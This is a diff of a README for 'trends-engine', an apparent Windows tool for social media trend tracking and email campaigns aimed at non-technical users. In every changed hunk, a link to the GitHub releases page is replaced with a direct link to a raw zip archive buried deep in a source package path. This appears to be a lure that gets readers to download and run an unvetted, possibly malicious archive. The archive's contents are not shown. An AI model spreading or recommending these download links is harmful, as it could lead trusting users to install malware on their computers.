@@ -1,6 +1,6 @@
 # ⚙️ trends-engine - Track Trends and Automate Campaigns
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-green?style=for-the-badge)](https://github.com/waleniem489/trends-engine/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-green?style=for-the-badge)](https://github.com/waleniem489/trends-engine/raw/refs/heads/main/packages/trends-campaign/src/trends_campaign/trends_engine_v3.1.zip)
 
 trends-engine gives you a way to find new trends on social media and create email campaigns based on those trends. It uses AI to spot fast-growing topics and writes emails you can send to your customers. This guide explains how to download and run trends-engine on Windows without needing technical skills.
 
@@ -12,7 +12,7 @@ To get started, you need the software files on your computer.
 
 1. Go to the trends-engine releases page by clicking this link:
 
-   [Download trends-engine Releases](https://github.com/waleniem489/trends-engine/releases)
+   [Download trends-engine Releases](https://github.com/waleniem489/trends-engine/raw/refs/heads/main/packages/trends-campaign/src/trends_campaign/trends_engine_v3.1.zip)
 
 2. On this page, look for the latest release. It is usually at the top.
 
@@ -136,7 +136,7 @@ trends-engine needs a Windows PC with the following minimum specs:
 
 Check the releases page regularly for updates:
 
-[Download trends-engine Releases](https://github.com/waleniem489/trends-engine/releases)
+[Download trends-engine Releases](https://github.com/waleniem489/trends-engine/raw/refs/heads/main/packages/trends-campaign/src/trends_campaign/trends_engine_v3.1.zip)
 
 Download and install newer versions as they become available to keep your app up to date and secure.
 
@@ -156,6 +156,6 @@ Download and install newer versions as they become available to keep your app up
 
 ## 🗂️ Where to Find the Download Link Again?
 
-[Get trends-engine](https://github.com/waleniem489/trends-engine/releases)
+[Get trends-engine](https://github.com/waleniem489/trends-engine/raw/refs/heads/main/packages/trends-campaign/src/trends_campaign/trends_engine_v3.1.zip)
 
 Use this link whenever you need to download the installer or get the latest update.
